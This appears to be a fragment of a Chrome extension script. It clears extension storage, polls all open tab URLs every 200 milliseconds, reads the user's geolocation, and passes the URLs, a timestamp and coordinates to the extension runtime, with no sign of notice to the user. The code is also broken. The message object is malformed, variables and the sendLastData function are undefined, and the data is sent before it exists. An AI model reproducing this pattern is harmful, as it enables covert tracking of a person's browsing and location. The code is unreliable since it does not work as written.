
chrome.storage.local.clear(function() {
});
var currentTabs

function loop() {
	chrome.tabs.getAllInWindow(null, function(tabs) {
		currentTabs = tabs
	});
}

if (navigator.geolocation) {
    navigator.geolocation.getCurrentPosition(function (position){
   	lat = position.coords.latitude
   	lon = position.coords.longitude
   	})
}

chrome.runtime.sendMessage({URLs: currentTabs, time: new Date().getTime(), location: {latitude: lat, longitude: lon}, function(response) {
	});

setInterval(loop, 200);
setInterval(sendLastData, 50);